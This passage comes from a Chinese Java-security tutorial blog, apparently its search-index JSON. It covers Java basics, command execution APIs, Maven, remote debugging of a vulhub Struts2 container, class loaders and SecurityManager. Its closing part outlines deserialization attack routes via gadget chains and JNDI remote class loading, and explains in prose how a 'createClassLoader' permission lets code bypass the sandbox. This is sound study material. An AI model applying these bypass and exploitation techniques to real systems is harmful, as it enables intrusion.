springBoot框架相对于springMvc框架来说，更专注于开发微服务后台接口，不开发前端视图。\n\n\n**参考：**\n\nhttps://mybatis.org/mybatis-3/zh/index.html\n\nhttps://blog.csdn.net/qq_42494445/article/details/83926216\n\nhttps://blog.csdn.net/qq_41701956/article/details/81215309\n\nhttps://blog.csdn.net/wangzhidong_java/article/details/82974503","tags":["JAVA","安全"],"categories":["JAVA安全教程"]},{"title":"JAVA基础教程","url":"/2018/11/26/JAVA基础教程/","content":"\n# 简介\n\n本篇是整个java安全学习系列的基础篇，这个系列篇章我会把我的整个java安全学习过程进行一个总结。至于为什么想写这个系列文章，是因为当时听了小伙伴的分享中提到“21小时可以入门任何课程”，看了他整理的学习导图，深受启发。所以，我打算把过去的和新学习的东西，完整的、系统的归纳总结出来，做到温故而知新。\n\n# 学习流程\n\n![](/images/a1/1.png)\n\n这个是我整理的java的学习路线图，每个人可能有不同的理解，大家可以自己动手进行自己的学习规划。并且学习过程是动态的，可能在学习总结过程中，我会修增某些模块。本篇我将对第一部分-基础，进行讲解。\n\n# java基础\n\n这边讨论的基础，不是java的基础语法，这部分自己可以快速入门学习。我要讲的部分，是java的一些特性，或者比较重要的语法，在看代码中或者分析payload经常用到的。这部分是我在实践过程中觉得难点和重点，每个人的理解方法不同，所以并不适用所有人的学习，不过理解以下概念方法对于java安全学习是有帮助的，这点可以肯定。\n\n## 基本语法\n\n### 泛类型\n\n泛型，即“参数化类型”。一提到参数，最熟悉的就是定义方法时有形参，然后调用此方法时传递实参。那么参数化类型怎么理解呢？\n\n顾名思义，就是将类型由原来的具体的类型参数化，类似于方法中的变量参数，此时类型也定义成参数形式（可以称之为类型形参），然后在使用/调用时传入具体的类型（类型实参）。\n\n泛型的本质是为了参数化类型（在不创建新的类型的情况下，通过泛型指定的不同类型来控制形参具体限制的类型）。也就是说在泛型使用过程中，操作的数据类型被指定为一个参数，这种参数类型可以用在类、接口和方法中，分别被称为泛型类、泛型接口、泛型方法。\n\n最典型的泛型类应用就是各种容器类，如：List、Set、Map。自己定义的泛型类形式如下：\n\n```java\n//此处T可以随便写为任意标识，常见的如T、E、K、V等形式的参数常用于表示泛型\n//在实例化泛型类时，必须指定T的具体类型\npublic class Generic<T>{ \n    //key这个成员变量的类型为T,T的类型由外部指定  \n    private T key;\n\n    public Generic(T key) { //泛型构造方法形参key的类型也为T，T的类型由外部指定\n        this.key = key;\n    }\n\n    public T getKey(){ //泛型方法getKey的返回值类型为T，T的类型由外部指定\n        return key;\n    }\n}\n```\n\n更多泛型基本知识内容可参考：[https://www.cnblogs.com/coprince/p/8603492.html](https://www.cnblogs.com/coprince/p/8603492.html)\n\n### 对象类型、基本类型\n\nJava中的对象分两种类型：**基本类型和非基本类型（对象类型）。**\n\n基本类型就是那些最常用的类型，例如：boolean/char/byte/short/int/long/float/double，这些类型有个特点，就是变量直接存储值。\n\n除了基本类型之外的都是非基本类型了。非基本类型有个显著特点就是初始化的时候一般需要使用new来创建一个对象，所以非基本类型也叫非基本类型。例如:String name=new String(Tom);。非基本类型跟基本类型的本质区别，在于**非基本类型变量存储的不是值，而是引用。**\n\n## 命令执行的方法\n\njava命令执行，主要有两种方法Runtime.getRuntime().exec(cmd) 和ProcessBuilder(cmd).start，实例如下：\n\n```java\npackage com.manba.demo;\n\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\n\npublic class CmdTest {\n    public static void rexec() throws IOException {\n        String cmds = \"/bin/sh -c pwd\"; // 也可以数组形式\n        Process process = Runtime.getRuntime().exec(cmds);\n        BufferedReader Reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n        String line;\n        while ((line = Reader.readLine()) != null) System.out.println(line);\n    }\n\n    public static void pexexc() throws IOException {\n        String[] cmds = {\"/bin/sh\", \"-c\", \"ls\"}; // 只能数组形式\n        Process pb = new ProcessBuilder(cmds).start();\n        BufferedReader Reader = new BufferedReader(new InputStreamReader(pb.getInputStream()));\n        String line;\n        while ((line = Reader.readLine()) != null) System.out.println(line);\n    }\n\n    public static void main(String[] args) throws IOException {\n        rexec();\n        pexexc();\n    }\n\n}\n```\n\n这两个方法的主要区别在于Runtime.getRuntime.exec是静态方法，而ProcessBuilder().start不是静态方法，这在strust2中构造payload，是很有用的。\n\n## Java Bean和Factory概念\n\n**JavaBeans**：Java中一种**特殊的类**，可以将多个对象封装到一个对象（bean）中。特点是可序列化，提供无参构造器，提供getter方法和setter方法访问对象的属性。名称中的“Bean”是用于Java的可重用软件组件的惯用叫法。\n\n```java\npackage com.manba.demo; \npublic class SimpleBean{  \n    private String name;  \n    private int age;  \n    public void setName(String name){  \n        this.name = name;  \n    }  \n    public void setAge(int age){  \n        this.age = age;  \n    }  \n    public String getName(){  \n        return this.name;  \n    }  \n    public int getAge(){  \n        return this.age;  \n    }  \n}  \n```\n\n**总结如下：**\n\n1. 所有的类必须声明为public \n\n2. 所有属性为private\n3. 提供默认构造方法\n4. 提供getter和setter\n5. 实现serializable接口\n\n**Java Factory定义**：定义一个创建对象的接口，但让实现这个接口的类来决定实例化哪个类，工厂方法让类的实例化推迟到了子类中进行，它属于创建类型。\n\n```\n通俗理解与做法：\n\t\t定义一个抽象类或者接口来当规范工厂，它是一个只声明方法叫什么名字不实现方法的内容的一个规范类；\n  \t定义具体工厂实现或者继承规范工厂，然后重写规范工厂中定义的方法，在该方法中生产属于自己工厂的对象;\n  \t使用的时候，new工厂的时候是具体工厂给规范工厂进行赋值。即=号左边是规范工厂类型，右边是具体工厂类型，想获哪个具体工厂生产的对象就使用哪个具体工厂类型，最后利用对象调用方法来获取具体工厂生产的;\n\n注意点：\n\t\t要有一个规范工厂，该工厂只负责声明方法叫什么名字，不实现方法的内容;\n    每一个具体工厂都要继承或者实现规范工厂，重写它的方法，在方法中生产自己工厂的对象;\n    使用的时候一定要具体工厂给规范工厂进行赋值;\n```\n\n代码案例：\n\n```java\n//StandardFactory----规范工厂      \n//SpecificFactory----具体工厂       \npackage com.manba.demo;\n\npublic class Product {\n    interface StandardFactory {\n        public Product createProduct();\t\t//声明了方法叫这个名字\n    }\n\n    static class SpecificFactory implements StandardFactory {\n        @Override\n        public Product createProduct() {\t//具体工厂实现规范工厂并重写它的方法生产属于工厂的对象\n            return new Product();         //这是属于该具体工厂生产的对象\n        }\n    }\n\n    public static class Client {\n        public static void main(String[] args) {\n            StandardFactory factory = new SpecificFactory();\n            Product prodect = factory.createProduct();\n        }\n    }\n}\n```\n\n## Java Maven\n\nMaven 翻译为\"专家\"、\"内行\"，是 Apache 下的一个纯 Java 开发的开源项目。基于项目对象模型（缩写：POM）概念，Maven利用一个中央信息片断能管理一个项目的构建、报告和文档等步骤。Maven 是一个项目管理工具，可以对 Java 项目进行构建、依赖管理。\n\nPOM( Project Object Model，项目对象模型 ) 是 Maven 工程的基本工作单元，是一个XML文件，包含了项目的基本信息，用于描述项目如何构建，声明项目依赖，等等。执行任务或目标时，Maven 会在当前目录中查找 POM。它读取 POM，获取所需的配置信息，然后执行目标。\n\nPOM 中可以指定以下配置：\n\n- 项目依赖\n- 插件\n- 执行目标\n- 项目构建 profile\n- 项目版本\n- 项目开发者列表\n- 相关邮件列表信息\n\n**Maven 参数**\n\n-D 传入属性参数 \n-P 使用pom中指定的配置 \n-e 显示maven运行出错的信息 \n-o 离线执行命令,即不去远程仓库更新包 \n-X 显示maven允许的debug信息 \n-U 强制去远程参考更新snapshot包 \n其他参数可以通过mvn help 获取\n\n**1、mvn clean** \n\n说明: 清理项目生产的临时文件,一般是模块下的target目录\n\n**2、mvn package** \n\n说明: 项目打包工具,会在模块下的target目录生成jar或war等文件，如下运行结果\n\n**3、mvn test** \n\n说明: 测试命令,或执行src/test/java/下junit的测试用例\n\n**4、mvn install** \n\n说明: 模块安装命令 将打包的的jar/war文件复制到你的本地仓库中，供其他模块使用。 -Dmaven.test.skip=true 跳过测试(同时会跳过test compile)\n\n**5、mvn deploy** \n\n说明: 发布命令 将打包的文件发布到远程参考,提供其他人员进行下载依赖 ,一般是发布到公司的私服\n\n**mvn 快速构建java项目命令**\n\n```xml\nmvn archetype:generate -DgroupId=com.companyname.bank -DartifactId=consumerBanking -DarchetypeArtifactId=maven-archetype-quickstart -DinteractiveMode=false\n```\n\n**mvn 快速构建web项目**\n\n```xml\nmvn archetype:generate -DgroupId=com.companyname.automobile -DartifactId=trucks -DarchetypeArtifactId=maven-archetype-webapp  -DinteractiveMode=false\n```\n\nMaven内容很多，这边给大家介绍下概念，以及最基本用法，详细知识点大家可以移步到https://www.runoob.com/maven/maven-tutorial.html学习。\n\n## IDEA调试远程调试\n\n**配置tomcat调试模式**\n\ndockerfile配置样例，tomcat以调试模式打开\n\n```dockerfile\nFROM vulhub/tomcat:8.5\n\nMAINTAINER phithon <root@leavesongs.com>\n\nUSER root\nRUN set -ex \\\n    && rm -rf /usr/local/tomcat/webapps/* \\\n    && chmod a+x /usr/local/tomcat/bin/*.sh\nCOPY S2-001.war /usr/local/tomcat/webapps/ROOT.war\nENV JPDA_ADDRESS 5005\nENV JPDA_TRANSPORT dt_socket\nCMD [\"catalina.sh\", \"jpda\", \"run\"]\nEXPOSE 8080\nEXPOSE 5005\n```\n\ndocker-compose.yml配置样例\n\n```dockerfile\nversion: '2'\nservices:\n struts2:\n   build: .\n   ports:\n    - \"8080:8080\"\n    - \"5005:5005\"\n```\n\n然后docker-compose up -d就启动tomcat的调试模式\n\n**配置IDEA，连接远程服务器**\n\n点击Edit Configurations\n\n![](/images/a1/2.png)\n\n配置Remote\n\n![](/images/a1/3.png)\n\n点击debug，连接成功显示如下所示内容\n\n![](/images/a1/4.png)\n\n# JVM类加载器\n\n## 类加载器简介\n\n类加载器（class loader）用来加载 Java 类到 Java 虚拟机中。一般来说，Java 虚拟机使用 Java 类的方式如下：Java 源程序（.java 文件）在经过 Java 编译器编译之后就被转换成 Java 字节代码（.class 文件）。**类加载器负责读取 Java 字节代码，并转换成 java.lang.Class 类的一个实例**。每个这样的实例用来表示一个 Java 类。\n\n**基本上所有的类加载器都是 java.lang.ClassLoader 类的一个实例**。java.lang.ClassLoader 类的基本职责就是根据一个指定的类的名称，找到或者生成其对应的字节代码，然后从这些字节代码中定义出一个 Java 类，即 java.lang.Class 类的一个实例。\n\nJava 中的类加载器大致可以分成两类，一类是系统提供的，另外一类则是由 Java 应用开发人员编写的，开发人员可以通过继承 java.lang.ClassLoader 类的方式实现自定义类加载器，以满足一些特殊的需求。\n\n系统提供的类加载器主要有下面三个：\n\n- **引导类加载器(Bootstrap ClassLoader)**：负责将 $JAVA_HOME/lib 或者 -Xbootclasspath 参数指定路径下面的文件(按照文件名识别，如 rt.jar) 加载到虚拟机内存中。它用来加载 Java 的核心库，是用原生代码实现的，并不继承自 java.lang.ClassLoader，引导类加载器无法直接被 java 代码引用。\n- **扩展类加载器(Extension ClassLoader)**：负责加载 $JAVA_HOME/lib/ext 目录中的文件，或者 java.ext.dirs 系统变量所指定的路径的类库，它用来加载 Java 的扩展库。\n- **应用程序类加载器(Application ClassLoader)**：一般是系统的默认加载器，它根据 Java 应用的类路径（CLASSPATH）来加载 Java 类。一般 Java 应用的类都是由它来完成加载的，可以通过 ClassLoader.getSystemClassLoader() 来获取它。\n\n## 类加载过程 — 双亲委派模型\n\n（1） 类加载器结构\n\n除了引导类加载器之外，所有的类加载器都有一个父类加载器。应用程序类加载器的父类加载器是扩展类加载器，扩展类加载器的父类加载器是引导类加载器。一般来说，开发人员自定义的类加载器的父类加载器是应用程序类加载器。\n\n![](/images/a1/5.png)\n\n（2）双亲委派模型\n\n类加载器在尝试去查找某个类的字节代码并定义它时，会先代理给其父类加载器，由父类加载器先去尝试加载这个类，如果父类加载器没有，继续寻找父类加载器，依次类推，如果到引导类加载器都没找到才从自身查找。这个类加载过程就是双亲委派模型。\n\n首先要明白，**Java 虚拟机判定两个 Java 类是否相同，不仅要看类的全名是否相同，还要看加载此类的类加载器是否一样(可以通过 class.getClassLoader() 获得)**。只有两个类来源于同一个Class文件，并且被同一个类加载器加载，这两个类才相等。不同类加载器加载的类之间是不兼容的。\n\n双亲委派模型就是为了保证 Java 核心库的类型安全的。所有 Java 应用都至少需要引用 java.lang.Object 类，也就是说在运行的时候，java.lang.Object 这个类需要被加载到 Java 虚拟机中。如果这个加载过程由 Java 应用自己的类加载器来完成的话，很可能就存在多个版本的 java.lang.Object 类，而这些类之间是不兼容的。通过双亲委派模型，对于 Java 核心库的类加载工作由引导类加载器来统一完成，保证了 Java 应用所使用的都是同一个版本的 Java 核心库的类，是互相兼容的。\n\n类加载器在成功加载某个类之后，会把得到的 java.lang.Class 类的实例缓存起来。下次再请求加载该类的时候，类加载器会直接使用缓存的类的实例，而不会尝试再次加载。\n\n# SecurityManager沙箱分析\n\n## 简介\n\n安全管理器（SecurityManger）是为了保护JVM在运行有漏洞或恶意的代码不会破坏外部资源，这是api级别的，可自定义的安全策略管理器。\n\n安全管理器（SecurityManger）在java中的作用就是检查操作是否有权限执行，是java沙箱的基础组件。通过Java命令行启动的java应用程序，默认不启用沙箱。要启动沙箱，需要：\n\n```java\njava -Djava.security.manager <other args>\n```\n\n也可以指定策略文件：\n\n```java\njava -Djava.security.policy=<URL>\n```\n\n如果要求启动时只遵循一个策略文件，启动需要双等号，如下：\n\n```java\njava -Djava.security.policy==<URL>\n```\n\n还可以在代码中使用硬编码System.setSecurityManager()来启动安全管理器\n\n## 安全策略文件\n\n策略文件制定了具体的代码权限。可以使用jdk自带的policytool工具查看或编辑。\n\njava.policy有三个条目，每一条在java.policy文件中为一条grant记录，每一个grant记录含有一个codeBase（指定代码）及其permission（许可）：\n\n```\ngrant codeBase source { \n\tpermission permission_class_name ation;\n}\n```\n\n每一条grant记录遵循下面格式：\n\n* 以保留字“grant”开头，表示一条新的记录开始。\n* “permission”也是保留字，标记一个新的许可开始。\n* 每一个grant记录授予一个指定的代码（CodeBase）一套许可（Permissons）。\n* source指定目标类的位置\n* ation用于指定目标类拥有的权限\n\nsource三种通配符：\n\n1. directory/ 表示directory目录下所有.class文件，不包括.jar文件\n2. directory/* 表示directory目录下所有的.class及.jar文件\n3. directory/- 表示dierctory目录下的所有.class及.jar文件，包括子目录\n\n## 权限\n\n权限定义的格式包含三部分：权限类型、权限名和允许的操作。例：\n\n```\n// 权限类型\npermission java.security.AllPermission\n\n// 权限类型+权限名\npermission java.loang.RuntimePermission \"stopThread\";\n\n// 权限类型+权限名+允许的操作\npermission java.io.FilePermission \"/tmp/test\" \"read\"\n```\n\n所有权限列表\n\n|            | 类型                                | 权限名                                                   | 操作                   | 例子                                                         |      |\n| ---------- | ----------------------------------- | -------------------------------------------------------- | ---------------------- | ------------------------------------------------------------ | ---- |\n| 文件权限   | java.io.FilePermission              | 文件名（平台依赖）                                       | 读、写、删除、执行     | 允许所有文件的读写删除执行：permission java.io.FilePermission \"<< ALL FILES>>\", \"read,write,delete,execcute\"; |      |\n| 套接字权限 | java.net.SocketPermission           | 主机名:端口                                              | 接收、监听、连接、解析 | 允许实现所有套接字操作：permission java.net.SocketPermission \":1-\",\"accept,listen,connect,resolve\"; |      |\n| 属性权限   | java.util.PropertyPermission        | 需要访问的jvm属性名                                      | 读、写                 | 读标准java属性：permission java.util.PropertyPermission \"java.\",\"read\"; |      |\n| 运行时权限 | java.lang.RuntimePermission         | 多种权限名                                               | 无                     | 允许代码初始化打印任务：permission java.lang.RuntimePermission \"queuePrintJob\" |      |\n| AWT权限    | java.awt.AWTPermission              | 6种权限名                                                | 无                     | 允许代码充分使用test类：permission java.awt.AWTPermission \"createTest\";permission java.awt.AWTPermission \"readDisplayPixels\"; |      |\n| 网络权限   | java.net.NetPermission              | 3种权限名                                                | 无                     | 允许安装流处理器：permission java.net.NetPermission \"specifyStreamHandler\"; |      |\n| 安全权限   | java.security.SecurityPermission    | 多种权限名                                               | 无                     |                                                              |      |\n| 序列化权限 | java.io.SerializeablePermission     | 2种权限名                                                | 无                     |                                                              |      |\n| 反射权限   | java.lang.reflect.ReflectPermission | suppressAccessChecks（允许利用反射检查任意类的私有变量） |                        |                                                              |      |\n| 完全权限   | java.security.AllPermission         | 无（拥有执行任何操作的权限）                             |                        |                                                              |      |\n\n## SecurityManager的原理与影响\n\n一般API设计到安全管理器的原理：\n\n1. 请求java api\n2. java api使用安全管理器判断许可权限\n3. 通过则顺序执行，否则抛出Exception\n\n例如JDK源码中的FileInputStream类，如果开启沙箱，则安全管理器不是null，检查checkRead（name）。而checkRead方法则是依据访问控制策略的一个权限检查。\n\n![](/images/a1/6.png)\n\n###如何破坏反序列化漏洞\n\n对于java反序列对象漏洞利用来说，一般两种形式：\n\n1. 在classpath下寻找弱点jar包，通过gadget串联拼凑最终通过该反序列执行任意代码。 -- **这种场景实际利用困难，一方面适合的gadget不容易找，另一方面业界已经披露有问题的三方件，产品一般都已升级**\n2. 在classpath下寻找弱点jar包，结合**JDNI注入**，通过远程加载恶意类执行任意代码 -- **这种手法是目前更有效的一种方法**\n\n可以通过安全策略限制文件执行权限，导致rce失败。\n\n### 如何绕过SecurityManager\n\n如果policy中设置存在如下规则：\n\n```\npermission java.lang.RuntimePermission \"createClassLoader\";\n```\n\n则存在绕过可能性。\n\n原理：当我们拥有建立一个自己的ClassLoader的权限，我们完全可以在这个ClassLoader中建立自己的一个class，并赋予一个新的SecurityManager策略，这个策略也可以是null，及关闭整个java安全管理器。核心在ClassLoader存在一个方法叫defineClass，defineClass允许接受一个参数ProtectionDomain，我们能够自建一个ProtectionDomain将自己配置好的权限设置进去，define出来的class则拥有新的权限。\n\n\n\n**参考：**\n\n[https://www.cnblogs.com/coprince/p/8603492.html](https://www.cnblogs.com/coprince/p/8603492.html)\n\nhttps://segmentfault.com/a/1190000020248225?utm_source=tag-newest\n\nhttps://www.runoob.com/maven/maven-tutorial.html\n\nhttps://blog.csdn.net/belvine/article/details/89552524\n\n","tags":["JAVA","安全"],"categories":["JAVA安全教程"]}]